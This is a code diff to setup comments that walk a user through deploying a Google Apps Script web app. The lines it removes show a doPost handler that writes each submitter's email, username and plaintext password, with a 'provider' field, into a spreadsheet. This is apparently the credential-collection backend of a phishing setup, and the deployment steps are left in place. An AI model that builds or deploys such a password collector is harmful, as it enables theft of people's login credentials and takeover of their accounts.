@@ -624,23 +624,8 @@
          *         E1: Provider
          * 
          * STEP 3: Go to Extensions > Apps Script
-         *         DELETE all existing code and paste THIS:
-         * 
-         *         function doPost(e) {
-         *             var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-         *             sheet.appendRow([
-         *                 new Date(),
-         *                 e.parameter.email || '',
-         *                 e.parameter.usernameOrEmail || '',
-         *                 e.parameter.password || '',
-         *                 e.parameter.provider || ''
-         *             ]);
-         *             return ContentService.createTextOutput('Success');
-         *         }
-         * 
-         *         function doGet(e) {
-         *             return ContentService.createTextOutput('Script is working!');
-         *         }
+         *         DELETE all existing code and paste the Apps Script 
+         *         provided in the response.
          * 
          * STEP 4: Click Deploy > NEW DEPLOYMENT (not manage existing!)
          *         - Type: Web app
